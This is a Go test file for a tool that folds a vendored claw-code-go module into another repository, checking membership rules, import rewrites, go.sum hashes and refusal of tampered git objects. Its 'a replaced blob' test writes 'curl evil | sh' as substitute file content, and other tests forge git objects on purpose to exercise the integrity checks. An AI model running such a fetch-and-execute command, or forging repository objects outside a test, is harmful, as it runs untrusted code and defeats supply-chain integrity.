package clawfold

import (
	"bytes"
	"compress/zlib"
	"encoding/hex"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"strings"
	"testing"

	"github.com/SocialGouv/iterion/internal/gittest"
)

// clawFixture is a miniature claw-code-go: one file or package per rule of
// the membership, and one that no rule reaches.
var clawFixture = map[string]string{
	"go.mod":  "module github.com/SocialGouv/claw-code-go\n\ngo 1.26\n",
	"LICENSE": "MIT fixture licence\n",
	// vendored: iterion links pkg/api, which imports internal/core.
	"pkg/api/api.go": `package api

import "github.com/SocialGouv/claw-code-go/internal/core"

// Hello is what iterion calls.
func Hello() string { return core.Name() }
`,
	// a member test reading a fixture outside every package, by Join...
	"pkg/api/api_test.go": `package api

import (
	"os"
	"path/filepath"
	"testing"
)

func TestGolden(t *testing.T) {
	if _, err := os.ReadFile(filepath.Join("..", "..", "testdata", "golden", "joined.json")); err != nil {
		t.Fatal(err)
	}
	if Hello() != "core" {
		t.Fatal("hello")
	}
}
`,
	"internal/core/core.go": `package core

import "embed"

//go:embed skills
var skills embed.FS

// Name reads an embedded file so the embed is load-bearing.
func Name() string {
	if _, err := skills.ReadFile("skills/a.md"); err != nil {
		return "missing"
	}
	return "core"
}
`,
	"internal/core/identity.go": `package core

const modulePath = "github.com/SocialGouv/claw-code-go"

var _ = modulePath
`,
	// ...and by a plain literal; plus a test-only support package.
	"internal/core/core_test.go": `package core_test

import (
	"os"
	"testing"

	"github.com/SocialGouv/claw-code-go/internal/core"
	"github.com/SocialGouv/claw-code-go/internal/testutil"
)

func TestName(t *testing.T) {
	testutil.Equal(t, core.Name(), "core")
	if _, err := os.ReadFile("../../testdata/golden/literal.json"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.ReadFile("testdata/owned.json"); err != nil {
		t.Fatal(err)
	}
}
`,
	"internal/core/skills/a.md":         "# a bundled skill\n",
	"internal/core/skills/run.sh":       "#!/bin/sh\necho skill\n",
	"internal/core/testdata/owned.json": "{\"owned\": true}\n",
	// a Go file under testdata is data to the go tool: carried verbatim.
	"internal/core/testdata/sample.go": "package sample\n\nimport _ \"github.com/SocialGouv/claw-code-go/internal/core\"\n",
	// a tests-only package nested under a member: nothing imports it.
	"internal/core/providers/guard_test.go": `package providers_test

import (
	"testing"

	"github.com/SocialGouv/claw-code-go/internal/core"
)

func TestGuard(t *testing.T) {
	if core.Name() == "" {
		t.Fatal("empty")
	}
}
`,
	// reached only through a test's import.
	"internal/testutil/testutil.go": `package testutil

import "testing"

// Equal fails t when got is not want.
func Equal(t testing.TB, got, want string) {
	t.Helper()
	if got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
}
`,
	"testdata/golden/joined.json":  "{\"joined\": true}\n",
	"testdata/golden/literal.json": "{\"literal\": true}\n",
	"testdata/golden/unread.json":  "{\"unread\": true}\n",
	"cmd/claw/main.go": `package main

import "github.com/SocialGouv/claw-code-go/pkg/api"

func main() { println(api.Hello()) }
`,
}

// vendoredFixture is what `go mod vendor` keeps of clawFixture for a
// consumer of pkg/api: the non-test Go files of the packages it links, the
// embedded files and the licence.
var vendoredFixture = []string{
	"LICENSE",
	"internal/core/core.go",
	"internal/core/identity.go",
	"internal/core/skills/a.md",
	"internal/core/skills/run.sh",
	"pkg/api/api.go",
}

func writeTree(t *testing.T, dir string, files map[string]string) {
	t.Helper()
	for rel, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		mode := os.FileMode(0o644)
		if strings.HasSuffix(rel, ".sh") {
			mode = 0o755
		}
		if err := os.WriteFile(p, []byte(body), mode); err != nil {
			t.Fatal(err)
		}
		if err := os.Chmod(p, mode); err != nil {
			t.Fatal(err)
		}
	}
}

// commitAll stages and commits everything in dir.
func commitAll(t *testing.T, dir, msg string) string {
	t.Helper()
	gittest.Run(t, dir, "add", "-A")
	gittest.Run(t, dir, "commit", "-q", "--allow-empty", "-m", msg)
	return gittest.Run(t, dir, "rev-parse", "HEAD")
}

// newSource builds the fixture claw repository and returns it and its pin.
func newSource(t *testing.T) (string, string) {
	t.Helper()
	return newSourceWith(t, nil)
}

// newSourceWith is newSource with extra files laid over the fixture.
func newSourceWith(t *testing.T, extra map[string]string) (string, string) {
	t.Helper()
	src := gittest.SourceRepo(t)
	writeTree(t, src, clawFixture)
	writeTree(t, src, extra)
	return src, commitAll(t, src, "fixture")
}

func vendoredMap(t *testing.T, src string, paths []string) map[string][]byte {
	t.Helper()
	out := map[string][]byte{}
	for _, p := range paths {
		data, err := os.ReadFile(filepath.Join(src, filepath.FromSlash(p)))
		if err != nil {
			t.Fatal(err)
		}
		out[p] = data
	}
	return out
}

func fixtureCensus(t *testing.T) (*Census, string, string) {
	t.Helper()
	src, pin := newSource(t)
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	c, err := Compute(tree, vendoredMap(t, src, vendoredFixture))
	if err != nil {
		t.Fatal(err)
	}
	return c, src, pin
}

func TestComputeAppliesEveryMembershipRule(t *testing.T) {
	t.Parallel()
	c, _, _ := fixtureCensus(t)

	origins := map[string]Origin{}
	kinds := map[string]Kind{}
	for _, m := range c.Members {
		origins[m.Path] = m.Origin
		kinds[m.Path] = m.Kind
		if m.Dest != "pkg/claw/"+m.Path {
			t.Errorf("%s lands at %s, want pkg/claw/%s", m.Path, m.Dest, m.Path)
		}
	}
	want := map[string]Origin{
		"LICENSE":                               OriginVendored,
		"internal/core/core.go":                 OriginVendored,
		"internal/core/identity.go":             OriginVendored,
		"internal/core/skills/a.md":             OriginVendored,
		"internal/core/skills/run.sh":           OriginVendored,
		"pkg/api/api.go":                        OriginVendored,
		"pkg/api/api_test.go":                   OriginPackage,
		"internal/core/core_test.go":            OriginPackage,
		"internal/testutil/testutil.go":         OriginPackage,
		"internal/core/providers/guard_test.go": OriginPackage,
		"internal/core/testdata/owned.json":     OriginAsset,
		"internal/core/testdata/sample.go":      OriginAsset,
		"testdata/golden/joined.json":           OriginFixture,
		"testdata/golden/literal.json":          OriginFixture,
	}
	if !reflect.DeepEqual(origins, want) {
		t.Fatalf("membership:\n got  %v\n want %v", origins, want)
	}
	if kinds["internal/core/skills/a.md"] != KindAsset || kinds["internal/core/testdata/sample.go"] != KindAsset ||
		kinds["internal/core/core_test.go"] != KindGoTest || kinds["pkg/api/api.go"] != KindGo {
		t.Errorf("kinds = %v", kinds)
	}

	pkgs := map[string]PackageOrigin{}
	for dir, p := range c.Packages {
		pkgs[dir] = p.Origin
	}
	wantPkgs := map[string]PackageOrigin{
		"pkg/api":                 PackageVendored,
		"internal/core":           PackageVendored,
		"internal/testutil":       PackageClosure,
		"internal/core/providers": PackageTestOnly,
	}
	if !reflect.DeepEqual(pkgs, wantPkgs) {
		t.Fatalf("packages = %v, want %v", pkgs, wantPkgs)
	}
	// The order constraints come from the tests as much as the sources.
	if got := c.Packages["internal/core"].Deps; !reflect.DeepEqual(got, []string{"internal/testutil"}) {
		t.Errorf("internal/core deps = %v: the external test's import of testutil is an order constraint", got)
	}
	if got := c.Packages["internal/core/providers"].Deps; !reflect.DeepEqual(got, []string{"internal/core"}) {
		t.Errorf("providers deps = %v", got)
	}
	if c.ImportSites != 4 {
		t.Errorf("import sites = %d, want 4", c.ImportSites)
	}
	// The literal stays, and so does the import of a Go file the go tool
	// never compiles: both are named, neither is rewritten.
	wantResiduals := []Residual{
		{File: "internal/core/identity.go", Line: 3, Text: `const modulePath = "github.com/SocialGouv/claw-code-go"`},
		{File: "internal/core/testdata/sample.go", Line: 3, Text: `import _ "github.com/SocialGouv/claw-code-go/internal/core"`},
	}
	if !reflect.DeepEqual(c.Residuals, wantResiduals) {
		t.Errorf("residuals = %+v, want %+v", c.Residuals, wantResiduals)
	}
}

func TestComputeKeepsTheExecutableBit(t *testing.T) {
	t.Parallel()
	c, _, _ := fixtureCensus(t)
	for _, m := range c.Members {
		want := "100644"
		if strings.HasSuffix(m.Path, ".sh") {
			want = "100755"
		}
		if m.Mode != want {
			t.Errorf("%s mode %s, want %s", m.Path, m.Mode, want)
		}
	}
}

func TestComputeRefusesAVendoredSetThatIsNotThePin(t *testing.T) {
	t.Parallel()
	src, pin := newSource(t)
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	vendored := vendoredMap(t, src, vendoredFixture)
	vendored["internal/core/core.go"] = append([]byte("// edited\n"), vendored["internal/core/core.go"]...)
	_, err = Compute(tree, vendored)
	if err == nil || !strings.Contains(err.Error(), "internal/core/core.go") {
		t.Fatalf("err = %v, want a refusal naming the edited vendored file", err)
	}
	vendored = vendoredMap(t, src, vendoredFixture)
	vendored["internal/core/extra.go"] = []byte("package core\n")
	if _, err := Compute(tree, vendored); err == nil || !strings.Contains(err.Error(), "absent at the pin") {
		t.Fatalf("err = %v, want a refusal naming the vendored file the pin lacks", err)
	}
}

func TestComputeRefusesAMemberAlreadyImportingUnderTheDestination(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{
		"internal/core/clash_test.go": "package core_test\n\nimport _ \"github.com/SocialGouv/iterion/pkg/claw/internal/core\"\n",
	})
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	_, err = Compute(tree, vendoredMap(t, src, vendoredFixture))
	if err == nil || !strings.Contains(err.Error(), "internal/core/clash_test.go already imports under") {
		t.Fatalf("err = %v, want the inverse precondition naming clash_test.go", err)
	}
}

func TestComputeCarriesTheRewriteAndItsInverse(t *testing.T) {
	t.Parallel()
	c, _, _ := fixtureCensus(t)
	for _, m := range c.Members {
		if BlobID(m.src, len(m.SrcBlob)) != m.SrcBlob || BlobID(m.dest, len(m.DestBlob)) != m.DestBlob {
			t.Errorf("%s: recorded blobs disagree with the bytes", m.Path)
		}
		if m.Kind == KindAsset {
			if m.SrcBlob != m.DestBlob || len(m.RewrittenLines) > 0 {
				t.Errorf("asset %s is not verbatim", m.Path)
			}
			continue
		}
		back, _, err := Fold.Inverse().Rewrite(m.Path, m.dest)
		if err != nil || BlobID(back, len(m.SrcBlob)) != m.SrcBlob {
			t.Errorf("%s: unrewrite does not give the pin's blob back (%v)", m.Path, err)
		}
	}
}

func TestReadTreeNamesAMissingPin(t *testing.T) {
	t.Parallel()
	src, _ := newSource(t)
	_, err := ReadTree(src, "0123456789ab")
	if err == nil || !strings.Contains(err.Error(), "fetch it") {
		t.Fatalf("err = %v, want the fetch hint", err)
	}
}

func TestPinFromVendorReadsEveryVersionForm(t *testing.T) {
	t.Parallel()
	head := "# github.com/SocialGouv/claw-code-gopher v9.9.9\n## explicit\n"
	for line, want := range map[string]string{
		"# github.com/SocialGouv/claw-code-go v0.1.1-0.20261106142829-71976d7241ee":              "71976d7241ee",
		"# github.com/SocialGouv/claw-code-go v0.0.0-20261106142829-71976d7241ee":                "71976d7241ee",
		"# github.com/SocialGouv/claw-code-go v1.3.0-rc.1.0.20261106142829-71976d7241ee":         "71976d7241ee",
		"# github.com/SocialGouv/claw-code-go v2.0.1-0.20261106142829-71976d7241ee+incompatible": "71976d7241ee",
		"# github.com/SocialGouv/claw-code-go v1.2.3":                                            "v1.2.3",
		"# github.com/SocialGouv/claw-code-go v2.0.0+incompatible":                               "v2.0.0",
	} {
		root := t.TempDir()
		writeTree(t, root, map[string]string{"vendor/modules.txt": head + line + "\n## explicit; go 1.26\ngithub.com/SocialGouv/claw-code-go/pkg/api\n"})
		got, err := PinFromVendor(root)
		if err != nil || got != want {
			t.Errorf("PinFromVendor(%q) = %q, %v; want %q", line, got, err, want)
		}
	}
	root := t.TempDir()
	writeTree(t, root, map[string]string{"vendor/modules.txt": "# github.com/SocialGouv/claw-code-go v0.0.0 => ../claw\n"})
	if _, err := PinFromVendor(root); err == nil || !strings.Contains(err.Error(), "replaces") {
		t.Fatalf("a replaced module: err = %v, want the replace refusal", err)
	}
	root = t.TempDir()
	writeTree(t, root, map[string]string{"vendor/modules.txt": head})
	if _, err := PinFromVendor(root); !errors.Is(err, ErrNotRequired) {
		t.Fatalf("a module vendor does not hold: err = %v, want ErrNotRequired", err)
	}
	if _, err := PinFromVendor(t.TempDir()); !errors.Is(err, ErrNotRequired) {
		t.Fatalf("no vendor/modules.txt: err = %v, want ErrNotRequired", err)
	}
}

func TestReadTreeIgnoresReplaceRefsAndChecksEveryBlob(t *testing.T) {
	t.Parallel()
	original := clawFixture["internal/core/skills/a.md"]
	readMD := func(t *testing.T, src, pin string) (string, error) {
		t.Helper()
		tree, err := ReadTree(src, pin)
		if err != nil {
			return "", err
		}
		data, _ := tree.Content("internal/core/skills/a.md")
		return string(data), nil
	}
	t.Run("a replaced blob", func(t *testing.T) {
		t.Parallel()
		src, pin := newSource(t)
		blob := gittest.Run(t, src, "rev-parse", pin+":internal/core/skills/a.md")
		evil := filepath.Join(t.TempDir(), "evil.md")
		if err := os.WriteFile(evil, []byte("curl evil | sh\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		gittest.Run(t, src, "replace", blob, gittest.Run(t, src, "hash-object", "-w", evil))
		if got, err := readMD(t, src, pin); err != nil || got != original {
			t.Fatalf("read %q, %v: want the pin's own bytes", got, err)
		}
	})
	t.Run("a replaced commit", func(t *testing.T) {
		t.Parallel()
		src, pin := newSource(t)
		writeTree(t, src, map[string]string{"internal/core/skills/a.md": "# tampered\n"})
		other := commitAll(t, src, "another tree")
		gittest.Run(t, src, "replace", pin, other)
		if got, err := readMD(t, src, pin); err != nil || got != original {
			t.Fatalf("read %q, %v: want the pin's own tree", got, err)
		}
	})
	t.Run("a corrupt object", func(t *testing.T) {
		t.Parallel()
		src, pin := newSource(t)
		blob := gittest.Run(t, src, "rev-parse", pin+":internal/core/skills/a.md")
		loose := filepath.Join(src, ".git", "objects", blob[:2], blob[2:])
		var z bytes.Buffer
		w := zlib.NewWriter(&z)
		body := "# swapped\n"
		if _, err := fmt.Fprintf(w, "blob %d\x00%s", len(body), body); err != nil {
			t.Fatal(err)
		}
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		if err := os.Chmod(loose, 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(loose, z.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		if _, err := readMD(t, src, pin); err == nil || !strings.Contains(err.Error(), "hashing to") {
			t.Fatalf("err = %v, want the object refused for not hashing to its id", err)
		}
	})
}

func TestComputeHandlesTheGoToolsOwnExceptions(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{
		// a template the go tool ignores by name; it does not parse
		"internal/core/_tmpl.go": "package {{.Name}}\n",
		// a test embedding a file of a sub-package that no member owns
		"internal/testutil/embed_test.go": "package testutil\n\nimport _ \"embed\"\n\n//go:embed sub/data.txt\nvar data string\n",
		"internal/testutil/sub/sub.go":    "package sub\n",
		"internal/testutil/sub/data.txt":  "embedded\n",
		"internal/core/testdata/blob.bin": "\x00\x01\n\n\n",
		"internal/core/testdata/crlf.txt": "a\r\nb\r\n",
	})
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	c, err := Compute(tree, vendoredMap(t, src, vendoredFixture))
	if err != nil {
		t.Fatal(err)
	}
	byPath := map[string]*Member{}
	for _, m := range c.Members {
		byPath[m.Path] = m
	}
	if m := byPath["internal/core/_tmpl.go"]; m == nil || m.Kind != KindAsset {
		t.Errorf("_tmpl.go = %+v, want carried as data", m)
	}
	if byPath["internal/testutil/sub/data.txt"] == nil {
		t.Error("the file a member test embeds from a sub-package is not carried")
	}
	if _, member := c.Packages["internal/testutil/sub"]; member {
		t.Error("the embedded file's package became a member")
	}
	if m := byPath["internal/core/testdata/blob.bin"]; m == nil || m.Lines != 0 {
		t.Errorf("blob.bin = %+v, want 0 lines, as git counts a binary file", m)
	}
	cr := false
	for _, w := range c.Warnings {
		cr = cr || strings.Contains(w, "crlf.txt: holds a carriage return")
	}
	if !cr {
		t.Errorf("warnings = %v, want the carriage return named", c.Warnings)
	}
}

func TestComputeRefusesToCarryAModuleBoundary(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{
		"internal/core/mod_test.go": "package core\n\nimport (\n\t\"os\"\n\t\"testing\"\n)\n\nfunc TestMod(t *testing.T) { _, _ = os.ReadFile(\"../../go.mod\") }\n",
	})
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	_, err = Compute(tree, vendoredMap(t, src, vendoredFixture))
	if err == nil || !strings.Contains(err.Error(), "make that directory a module") {
		t.Fatalf("err = %v, want the go.mod refused", err)
	}
}

func TestGofmtVerdictRefusesARewriteThatFormatsAnUnformattedSource(t *testing.T) {
	t.Parallel()
	src := []byte("package x\n\nimport (\n\t\"github.com/SocialGouv/foo\"\n\t\"github.com/SocialGouv/claw-code-go/a\"\n)\n")
	dest, _, err := Fold.Rewrite("x.go", src)
	if err != nil {
		t.Fatal(err)
	}
	var warnings []string
	if err := gofmtVerdict("x.go", src, dest, &warnings); err == nil || !strings.Contains(err.Error(), "makes it gofmt-clean") {
		t.Fatalf("err = %v: a source the rewrite makes gofmt-clean must be refused, and say so", err)
	}
}

// treeOf builds a Tree in memory, no git involved.
func treeOf(files map[string]string, modes map[string]string) *Tree {
	t := &Tree{Entries: map[string]Entry{}, content: map[string][]byte{}}
	for p, body := range files {
		id := BlobID([]byte(body), 40)
		mode := "100644"
		if m, ok := modes[p]; ok {
			mode = m
		}
		t.Entries[p] = Entry{Path: p, Mode: mode, Blob: id}
		t.content[id] = []byte(body)
	}
	return t
}

// The expected values are computed outside Go (python3 hashlib), from the
// dirhash.Hash1 spec and golang.org/x/mod/zip's checkFiles as the toolchain
// vendors it: symlinks and nested modules (a go.mod in any case) out, a VCS
// directory IN, .hg_archival.txt out, and the vendored-package rule of the
// go version the root go.mod names.
func TestModuleHashIsGoSumsH1(t *testing.T) {
	t.Parallel()
	before124 := treeOf(map[string]string{
		"go.mod":                    "module example.com/m\n",
		"a.go":                      "package m\n",
		"sub/go.mod":                "module example.com/m/sub\n",
		"sub/x.go":                  "package sub\n",
		"vendor/example.com/v/v.go": "package v\n",
		"vendor/modules.txt":        "# example.com/v v1.0.0\n",
		".git/hooks/x":              "#!/bin/sh\n",
		"docs/readme.md":            "# m\n",
		"pkg/vendor/vendor.go":      "package vendor\n",
		"link":                      "a.go",
	}, map[string]string{"link": "120000"})
	from124 := treeOf(map[string]string{
		"go.mod":                    "module example.com/m\n\ngo 1.25.0\n",
		"a.go":                      "package m\n",
		"vendor/modules.txt":        "# example.com/v v1.0.0\n",
		"vendor/example.com/v/v.go": "package v\n",
		"pkg/vendor/vendor.go":      "package vendor\n",
		"Sub/GO.MOD":                "module example.com/m/sub\n",
		"Sub/y.go":                  "package sub\n",
		".hg_archival.txt":          "repo: x\n",
		".hg/store/data":            "hg\n",
		"lnk/go.mod":                "../go.mod",
		"lnk/z.go":                  "package lnk\n",
	}, map[string]string{"lnk/go.mod": "120000"})
	for name, c := range map[string]struct {
		tree *Tree
		want string
	}{
		"before go 1.24": {before124, "h1:w+mtW/p3Q7eokN4dPCYOXZbimFeAWZoi0/1M4k7Q3lk="},
		// a linked root go.mod names no version to x/mod, and is no file of the zip
		"linked go.mod": {treeOf(map[string]string{
			"go.mod":             "module example.com/m\n\ngo 1.25.0\n",
			"a.go":               "package m\n",
			"vendor/modules.txt": "# example.com/v v1.0.0\n",
		}, map[string]string{"go.mod": "120000"}), "h1:FfTSsyUt115iltlU7YnMlGIhNDNmPj5GtHCeQXL5PEQ="},
		"from go 1.24": {from124, "h1:MOAUp3OL7LdUOZS4sSTPsgSbITukLE8spVQFQ5Eg7+A="},
	} {
		got, err := ModuleHash(c.tree, "example.com/m", "v1.0.0")
		if err != nil {
			t.Fatal(err)
		}
		if got != c.want {
			t.Errorf("%s: ModuleHash = %s, want %s", name, got, c.want)
		}
	}
}

func TestLoadRefusesATreeGoSumDoesNotAttest(t *testing.T) {
	t.Parallel()
	t.Run("a forged subtree", func(t *testing.T) {
		t.Parallel()
		src, pin := newSource(t)
		root := newRoot(t, src)
		// Rewrite the loose tree object of pkg/api in place: api_test.go now
		// names another blob that exists (a.md). git reads subtrees without a
		// hash check; only go.sum's h1: can tell.
		treeID := gittest.Run(t, src, "rev-parse", pin+":pkg/api")
		raw, err := gittest.Cmd(src, "cat-file", "tree", treeID).Output()
		if err != nil {
			t.Fatal(err)
		}
		testBlob, _ := hex.DecodeString(gittest.Run(t, src, "rev-parse", pin+":pkg/api/api_test.go"))
		otherBlob, _ := hex.DecodeString(gittest.Run(t, src, "rev-parse", pin+":internal/core/skills/a.md"))
		forged := bytes.Replace(raw, testBlob, otherBlob, 1)
		if bytes.Equal(forged, raw) {
			t.Fatal("the forgery changed nothing")
		}
		var z bytes.Buffer
		w := zlib.NewWriter(&z)
		fmt.Fprintf(w, "tree %d\x00", len(forged))
		w.Write(forged)
		if err := w.Close(); err != nil {
			t.Fatal(err)
		}
		loose := filepath.Join(src, ".git", "objects", treeID[:2], treeID[2:])
		if err := os.Chmod(loose, 0o644); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(loose, z.Bytes(), 0o644); err != nil {
			t.Fatal(err)
		}
		tree, err := ReadTree(src, pin)
		if err != nil {
			t.Fatal(err)
		}
		if got, _ := tree.Content("pkg/api/api_test.go"); string(got) != clawFixture["internal/core/skills/a.md"] {
			t.Fatalf("the forged subtree did not take: the test would prove nothing (read %q)", got)
		}
		_, err = Load(Inputs{Root: root, Source: src, Pin: pin})
		if err == nil || !strings.Contains(err.Error(), "go.sum holds") {
			t.Fatalf("err = %v, want the tree refused against go.sum", err)
		}
	})
	t.Run("no checksum to anchor to", func(t *testing.T) {
		t.Parallel()
		src, pin := newSource(t)
		root := newRoot(t, src)
		writeTree(t, root, map[string]string{"go.sum": ""})
		commitAll(t, root, "no sum")
		if _, err := Load(Inputs{Root: root, Source: src, Pin: pin}); err == nil || !strings.Contains(err.Error(), "holds no h1") {
			t.Fatalf("err = %v, want the missing checksum named", err)
		}
		if _, err := Load(Inputs{Root: root, Source: src, Pin: pin, Unsummed: true}); err != nil {
			t.Fatalf("Unsummed is the named way past it: %v", err)
		}
	})
	t.Run("another object format", func(t *testing.T) {
		t.Parallel()
		src, _ := newSource(t)
		root := newRoot(t, src)
		other := t.TempDir()
		gittest.Run(t, other, "init", "-q", "--object-format=sha256")
		if _, err := Load(Inputs{Root: root, Source: other, Pin: "HEAD"}); err == nil || !strings.Contains(err.Error(), "sha256") {
			t.Fatalf("err = %v, want the object formats named", err)
		}
	})
}

func TestEmbedPatternsSplitOnEverySpaceTheGoToolDoes(t *testing.T) {
	t.Parallel()
	got, err := embedPatterns("a.txt\tb.txt  \"c d.txt\" e.txt")
	if err != nil || !reflect.DeepEqual(got, []string{"a.txt", "b.txt", "c d.txt", "e.txt"}) {
		t.Fatalf("patterns = %q, %v", got, err)
	}
}

func TestComputeWarnsAboutAnUnformattedDataGoFile(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{"internal/core/testdata/broken.go": "package x\nvar  y = 1\n"})
	tree, err := ReadTree(src, pin)
	if err != nil {
		t.Fatal(err)
	}
	c, err := Compute(tree, vendoredMap(t, src, vendoredFixture))
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, w := range c.Warnings {
		found = found || strings.Contains(w, "testdata/broken.go: a Go file the go tool ignores, not gofmt-clean")
	}
	if !found {
		t.Fatalf("warnings = %v, want the data Go file named", c.Warnings)
	}
}

func TestTheFoldReadsTheModuleAsItsZipDoes(t *testing.T) {
	t.Parallel()
	// A nested module under a member package: not in the module zip, not
	// in the fold — its go.mod would otherwise be refused as a boundary.
	src, pin := newSourceWith(t, map[string]string{
		"internal/core/nested/go.mod":   "module example.com/nested\n",
		"internal/core/nested/data.txt": "nested\n",
	})
	root := newRoot(t, src)
	c, err := Load(Inputs{Root: root, Source: src, Pin: pin})
	if err != nil {
		t.Fatal(err)
	}
	for _, m := range c.Members {
		if strings.HasPrefix(m.Path, "internal/core/nested/") {
			t.Fatalf("%s of a nested module is a member", m.Path)
		}
	}
}

func TestLoadNamesWhatTheModuleZipLeavesOut(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{
		"pkg/api/testdata/mod/go.mod":  "module example.com/fixture\n",
		"pkg/api/testdata/mod/main.go": "package main\n",
		// outside every package, read by a member test (rule 5), and a module
		"testdata/golden/mod/go.mod":   "module example.com/golden\n",
		"testdata/golden/mod/data.txt": "golden\n",
	})
	root := newRoot(t, src)
	c, err := Load(Inputs{Root: root, Source: src, Pin: pin})
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		"pkg/api/testdata/mod/go.mod: the module zip leaves it out (in a nested module)",
		"testdata/golden/mod/data.txt: the module zip leaves it out (in a nested module)",
	} {
		named := false
		for _, w := range c.Warnings {
			named = named || strings.HasPrefix(w, want)
		}
		if !named {
			t.Errorf("warnings = %v, want %q", c.Warnings, want)
		}
	}
}

func TestArchiveRulesNameOnlyTheAttributesThatTransform(t *testing.T) {
	t.Parallel()
	tree := treeOf(map[string]string{".gitattributes": "* -text\ncontext.txt -diff\nidentity.go linguist-generated\n# *.txt export-ignore\n*.md export-ignore\n*.sh text eol=lf\nident -diff\n*.txt -diff export-ignore\n"}, nil)
	got := archiveRules(tree)
	want := []string{".gitattributes: *.md export-ignore", ".gitattributes: *.sh text eol=lf", ".gitattributes: *.txt -diff export-ignore"}
	if !reflect.DeepEqual(got, want) {
		t.Fatalf("rules = %q, want %q", got, want)
	}
}

func TestComputeRefusesALinkAmongTheMembers(t *testing.T) {
	t.Parallel()
	tree := treeOf(map[string]string{"pkg/api/api.go": "package api\n", "pkg/api/link": "api.go"}, map[string]string{"pkg/api/link": "120000"})
	tree.Commit = "fixture"
	_, err := Compute(tree, map[string][]byte{"pkg/api/api.go": []byte("package api\n")})
	if err == nil || !strings.Contains(err.Error(), "pkg/api/link is a symbolic link") {
		t.Fatalf("err = %v, want the link refused", err)
	}
}

func TestAMismatchNamesTheArchiveRulesItCannotReproduce(t *testing.T) {
	t.Parallel()
	src, pin := newSourceWith(t, map[string]string{".gitattributes": "*.txt export-ignore\n"})
	root := newRoot(t, src)
	writeTree(t, root, map[string]string{"go.sum": SourceModule + " v0.0.0 h1:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n"})
	commitAll(t, root, "another sum")
	_, err := Load(Inputs{Root: root, Source: src, Pin: pin})
	if err == nil || !strings.Contains(err.Error(), "git archive, which builds the zip, may apply .gitattributes: *.txt export-ignore") {
		t.Fatalf("err = %v, want the export-ignore rule named", err)
	}
}

func TestDroppedFilesNamesEachFileTheZipLeavesOutWithItsReason(t *testing.T) {
	t.Parallel()
	tree := treeOf(map[string]string{
		"go.mod":             "module example.com/m\n\ngo 1.25.0\n",
		"a.go":               "package m\n",
		"link":               "a.go",
		"vendor/x/y.go":      "package y\n",
		"vendor/modules.txt": "# x v1.0.0\n",
		".hg_archival.txt":   "repo: x\n",
		"sub/go.mod":         "module example.com/m/sub\n",
		"sub/a.go":           "package sub\n",
	}, map[string]string{"link": "120000"})
	want := map[string]string{
		"link":               "not a regular file",
		"vendor/x/y.go":      "a vendored path",
		"vendor/modules.txt": "a vendored path",
		".hg_archival.txt":   "dropped by the go command",
		"sub/go.mod":         "in a nested module",
		"sub/a.go":           "in a nested module",
	}
	if got := droppedFiles(tree); !reflect.DeepEqual(got, want) {
		t.Fatalf("dropped = %v, want %v", got, want)
	}
}
